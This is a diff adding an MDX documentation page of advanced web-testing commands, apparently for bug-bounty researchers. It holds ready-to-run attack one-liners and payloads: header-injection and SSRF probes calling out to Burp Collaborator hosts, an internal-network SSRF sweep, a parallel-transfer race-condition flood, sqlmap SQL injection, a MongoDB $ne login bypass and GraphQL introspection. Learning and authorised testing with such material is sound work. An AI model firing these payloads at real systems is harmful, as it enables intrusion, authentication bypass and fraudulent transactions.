@@ -1,0 +1,95 @@
+
+---
+title: Advanced Techniques
+description: Complex attack vectors and advanced testing methods
+---
+
+import { CommandBlock } from '@/components/CommandBlock'
+
+# Advanced Techniques
+
+Sophisticated testing methodologies and complex attack vectors for experienced researchers.
+
+## Header Injection Testing
+
+<CommandBlock
+  title="XSS/SSRF Header Testing"
+  description="Tests for XSS and SSRF vulnerabilities using various methods."
+  command="cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e \"\e[1;32m$url\e[0m\"\"\n\"\"Method[1] X-Forwarded-For: xss+ssrf => $xss1\"\"\n\"\"Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2\"\"\n\"\"Method[3] Host: xss+ssrf ==> $xss3\"\"\n\"\"Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 \"\"\n\";done"
+/>
+
+<CommandBlock
+  title="CRLF Injection Test"
+  description="Test for CRLF injection vulnerabilities in HTTP headers."
+  command="curl -H $'Host: example.com\\r\\nX-Injected-Header: injected' https://example.com"
+/>
+
+## SSRF Testing
+
+<CommandBlock
+  title="SSRF with Burp Collaborator"
+  description="Test for Server-Side Request Forgery using external callback."
+  command="curl -X POST https://example.com/api/fetch -d '{\"url\":\"http://yourburpcollaborator.com\"}' -H 'Content-Type: application/json'"
+/>
+
+<CommandBlock
+  title="Internal Network SSRF"
+  description="Test SSRF against internal network services."
+  command="for i in {1..254}; do curl -s -o /dev/null -w \"%{http_code}\" \"https://example.com/fetch?url=http://192.168.1.$i:80\" & done; wait"
+/>
+
+## Race Condition Testing
+
+<CommandBlock
+  title="Parallel Request Race Condition"
+  description="Test for race conditions using parallel requests."
+  command="seq 1 100 | xargs -I{} -P 20 curl -s -X POST https://example.com/api/transfer -d 'amount=100&to=attacker'"
+/>
+
+<CommandBlock
+  title="Turbo Intruder Race Condition"
+  description="Advanced race condition testing with precise timing."
+  command="python3 turbo-intruder.py -u https://example.com/api/endpoint --race-condition"
+/>
+
+## Advanced SQLi Techniques
+
+<CommandBlock
+  title="Time-based Blind SQLi"
+  description="Advanced time-based SQL injection testing."
+  command="sqlmap -u 'https://example.com/page.php?id=1' --technique=T --time-sec=5 --batch"
+/>
+
+<CommandBlock
+  title="Second-order SQLi Testing"
+  description="Test for second-order SQL injection vulnerabilities."
+  command="sqlmap -r request.txt --second-order='https://example.com/profile' --batch"
+/>
+
+## NoSQL Injection
+
+<CommandBlock
+  title="MongoDB NoSQL Injection"
+  description="Test for NoSQL injection in MongoDB applications."
+  command="curl -X POST https://example.com/api/login -d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}' -H 'Content-Type: application/json'"
+/>
+
+<CommandBlock
+  title="NoSQLMap Automated Testing"
+  description="Automated NoSQL injection testing with NoSQLMap."
+  command="python3 nosqlmap.py -u https://example.com/api/users -p username,password"
+/>
+
+## GraphQL Testing
+
+<CommandBlock
+  title="GraphQL Introspection"
+  description="Extract GraphQL schema through introspection."
+  command="curl -X POST https://example.com/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name,type{name}}}}}\"}"
+/>
+
+<CommandBlock
+  title="GraphQL Batch Attack"
+  description="Test for GraphQL batching vulnerabilities."
+  command="curl -X POST https://example.com/graphql -H 'Content-Type: application/json' -d '[{\"query\":\"query{user(id:1){name}}\"}]'"
+/>
